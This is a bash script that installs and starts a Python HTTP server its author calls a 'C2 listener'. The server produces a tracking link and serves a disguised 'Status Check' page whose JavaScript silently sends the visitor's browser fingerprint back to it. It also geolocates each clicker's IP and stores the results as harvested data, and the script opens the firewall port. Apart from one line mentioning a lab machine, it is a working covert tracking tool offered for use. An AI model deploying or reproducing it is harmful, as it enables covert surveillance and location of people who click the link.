set -e

PORT=8080
LOG_DIR="./received_logs"
SCRIPT_NAME="c2_listener.py"

if [ "$(id -u)" -eq 0 ]; then
    SUDO=""
else
    SUDO="sudo"
fi

echo "=================================================================="
echo " [*] Initializing C2 Server Setup"
echo "=================================================================="

echo " [*] Checking dependencies (Python 3)..."
if ! command -v python3 &> /dev/null; then
    echo " [!] Python3 is required but not installed."
    if command -v apt-get &> /dev/null; then
        echo " [!] Installing via apt-get..."
        $SUDO apt-get update && $SUDO apt-get install -y python3 python3-pip
    else
        echo " [!] Install Python 3 manually, then re-run this script."
        exit 1
    fi
else
    echo " [+] Python3 is already installed."
fi

mkdir -p "$LOG_DIR"
echo " [+] Created log storage directory: $LOG_DIR"

echo " [*] Writing listener script to $SCRIPT_NAME..."

cat << 'EOF' > "$SCRIPT_NAME"
import http.server
import urllib.parse
import urllib.request
import json
import ipaddress
import os
from datetime import datetime

PORT = 8080
LOG_DIR = "./received_logs"

TRACKER_PAGE = """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Status Check</title>
<script>
function sendFingerprint() {
    var nav = navigator;
    var data = {
        "user_agent": nav.userAgent,
        "platform": nav.platform || (nav.userAgentData && nav.userAgentData.platform) || "",
        "cpu_cores": nav.hardwareConcurrency || "",
        "memory_gb": nav.deviceMemory || "",
        "language": nav.language,
        "languages": (nav.languages || []).join(","),
        "timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "screen": screen.width + "x" + screen.height,
        "color_depth": screen.colorDepth,
        "cookies_enabled": nav.cookieEnabled,
        "referrer": document.referrer,
        "timestamp": new Date().toISOString()
    };
    var payload = encodeURIComponent(JSON.stringify(data));
    fetch("/?id=beacon", {
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: "data=" + payload
    }).catch(function(){});
}
sendFingerprint();
</script>
</head>
<body>
<h1>Status: Connected</h1>
</body>
</html>"""

class C2Handler(http.server.BaseHTTPRequestHandler):

    def geolocate(self, client_ip):
        try:
            if ipaddress.ip_address(client_ip).is_private:
                return "Local network (private IP, cannot be geolocated)"
        except ValueError:
            pass
        try:
            url = "http://ip-api.com/json/{0}?fields=status,country,regionName,city,lat,lon,isp,query".format(client_ip)
            with urllib.request.urlopen(url, timeout=8) as resp:
                info = json.loads(resp.read().decode("utf-8"))
            if info.get("status") == "success":
                return "{0}, {1}, {2} ({3}, {4}) - ISP: {5}".format(
                    info.get("city"), info.get("regionName"), info.get("country"),
                    info.get("lat"), info.get("lon"), info.get("isp"))
            return "Location lookup failed: {0}".format(info.get("message", "unknown"))
        except Exception as e:
            return "Location lookup error: {0}".format(e)

    def do_GET(self):
        client_ip = self.client_address[0]
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        tracking_id = query.get("id", ["-"])[0]
        location = self.geolocate(client_ip)

        print(f"\n[+] Link clicked from IP: {client_ip} | Time: {timestamp} | ID: {tracking_id}")
        print(f"    Path: {parsed.path} | Location: {location}")
        print("--------------------------------------------------")

        filename = os.path.join(LOG_DIR, f"click_{client_ip}_{timestamp}.log")
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"IP: {client_ip}\nTime: {timestamp}\nPath: {parsed.path}\nID: {tracking_id}\nLocation: {location}\n")
        print(f" [+] Saved click report to: {filename}")

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(TRACKER_PAGE.encode("utf-8"))

    def do_POST(self):
        try:
            content_length = int(self.headers.get("Content-Length", 0))
            post_data = self.rfile.read(content_length).decode("utf-8", errors="ignore")

            parsed_data = urllib.parse.parse_qs(post_data)
            data_payload = parsed_data.get("data", [""])[0]

            if not data_payload:
                data_payload = post_data

            client_ip = self.client_address[0]
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

            print(f"\n[+] Incoming data packet from IP: {client_ip} | Time: {timestamp}")
            print("--------------------------------------------------")
            print(f"{data_payload}")
            print("--------------------------------------------------")

            filename = os.path.join(LOG_DIR, f"{client_ip}_{timestamp}.log")
            with open(filename, "w", encoding="utf-8") as f:
                f.write(data_payload)
            print(f" [+] Successfully saved payload to: {filename}")

            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ACK")

        except Exception as e:
            print(f" [!] Error processing request: {e}")
            self.send_response(500)
            self.end_headers()

    def log_message(self, format, *args):
        return

if __name__ == "__main__":
    server_address = ("", PORT)
    httpd = http.server.HTTPServer(server_address, C2Handler)
    print(f"\n[*] C2 Listener successfully bound to port {PORT}")
    print(f"[*] Storing harvested data inside: {os.path.abspath(LOG_DIR)}")
    print(f"[*] Press Ctrl+C to terminate the server.\n")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down C2 server gracefully...")
        httpd.server_close()
EOF

chmod +x "$SCRIPT_NAME"
echo " [+] Listener script generated and made executable."

echo " [*] Opening port $PORT in firewall..."
open_port() {
    if command -v ufw > /dev/null 2>&1; then
        $SUDO ufw allow "$PORT"/tcp > /dev/null 2>&1 && echo " [+] Port $PORT opened via ufw." || echo " [!] ufw rule failed to add (run 'sudo ufw enable' first?)."
        return 0
    fi
    if command -v firewall-cmd > /dev/null 2>&1; then
        $SUDO firewall-cmd --permanent --add-port="$PORT"/tcp > /dev/null 2>&1 || true
        $SUDO firewall-cmd --reload > /dev/null 2>&1 || true
        echo " [+] Port $PORT opened via firewalld."
        return 0
    fi
    if command -v iptables > /dev/null 2>&1; then
        if $SUDO iptables -C INPUT -p tcp --dport "$PORT" -j ACCEPT > /dev/null 2>&1; then
            echo " [+] Port $PORT rule already present (iptables)."
        else
            $SUDO iptables -A INPUT -p tcp --dport "$PORT" -j ACCEPT > /dev/null 2>&1 && echo " [+] Port $PORT opened via iptables." || echo " [!] iptables rule failed to add."
        fi
        return 0
    fi
    echo " [!] No firewall tool detected. If a firewall blocks $PORT, open it manually."
}
open_port

echo " [*] Detecting server IP..."
detect_ip() {
    if command -v hostname > /dev/null 2>&1; then
        local ip
        ip=$(hostname -I 2>/dev/null | awk '{print $1}')
        if [ -n "$ip" ] && [ "$ip" != "127.0.0.1" ]; then
            echo "$ip"
            return
        fi
    fi
    if command -v ipconfig > /dev/null 2>&1; then
        local ip
        ip=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)
        if [ -n "$ip" ]; then
            echo "$ip"
            return
        fi
    fi
    echo "127.0.0.1"
}
SERVER_IP=$(detect_ip)

echo "=================================================================="
echo " Setup Complete!"
echo ""
echo " [1] Tracking link - READY TO SEND to Windows lab machine:"
echo "     http://${SERVER_IP}:${PORT}/?id=lab-1"
echo "     (opsional: ganti 'lab-1' dengan nama unik mesin, misal ?id=win-lab-2)"
echo ""
echo " [2] Start listener again later with:"
echo "     python3 -u $SCRIPT_NAME"
echo ""
echo " [3] If server is a cloud VM, also allow port $PORT in the cloud"
echo "     security group / network firewall."
echo "=================================================================="

echo " [*] Starting C2 listener on port $PORT (Ctrl+C to stop)..."
python3 -u "$SCRIPT_NAME"
